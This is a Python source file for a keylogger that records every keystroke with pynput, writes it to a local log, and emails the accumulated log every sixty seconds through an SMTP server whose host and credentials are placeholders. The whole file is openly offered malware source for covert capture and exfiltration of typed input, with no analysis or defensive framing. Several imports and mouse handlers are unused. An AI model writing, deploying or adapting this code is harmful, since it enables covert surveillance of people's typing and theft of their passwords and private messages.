import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Email configuration
EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_email_password"
SEND_REPORT_EVERY = 60  # as in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        # Initialize keylogger with time interval for report sending
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        self.running = True  # Flag to control the main loop

    def append_log(self, string):
        # Method to append log messages
        self.log += string

    def on_move(self, x, y):
        # Callback for mouse move event
        logging.info("Mouse moved to {} {}".format(x, y))
        self.append_log(f"Mouse moved to {x}, {y}\n")

    def on_click(self, x, y, button, pressed):
        # Callback for mouse click event
        action = 'Pressed' if pressed else 'Released'
        logging.info(f"{action} {button} at ({x}, {y})")
        self.append_log(f"{action} {button} at ({x}, {y})\n")

    def on_scroll(self, x, y, dx, dy):
        # Callback for mouse scroll event
        logging.info(f"Scrolled {dx} {dy} at ({x}, {y})")
        self.append_log(f"Scrolled {dx} {dy} at ({x}, {y})\n")

    def on_press(self, key):
        # Callback for key press event
        try:
            logging.info(f"Key {key.char} pressed")
            self.append_log(f"Key {key.char} pressed\n")
        except AttributeError:
            logging.info(f"Special key {key} pressed")
            self.append_log(f"Special key {key} pressed\n")

    def send_mail(self, message):
        # Method to send email with logged data
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Keylogger Report"

        body = f"Keylogger Report:\n\n{message}"
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.example.com', 587) as server:
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, msg.as_string())

    def report(self):
        # Method to send report via email
        self.send_mail(self.log)
        self.log = ""  # Clear log after sending
        if self.running:
            threading.Timer(self.interval, self.report).start()

    def start(self):
        # Start reporting thread and keyboard listener
        self.report()
        with Listener(on_press=self.on_press) as keyboard_listener:
            keyboard_listener.join()

    def stop(self):
        # Stop keylogger
        self.running = False

if __name__ == "__main__":
    # Set up logging configuration
    logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')

    # Create KeyLogger instance
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)

    try:
        # Start the keylogger
        keylogger.start()
    except KeyboardInterrupt:
        # Stop the keylogger if interrupted
        keylogger.stop()
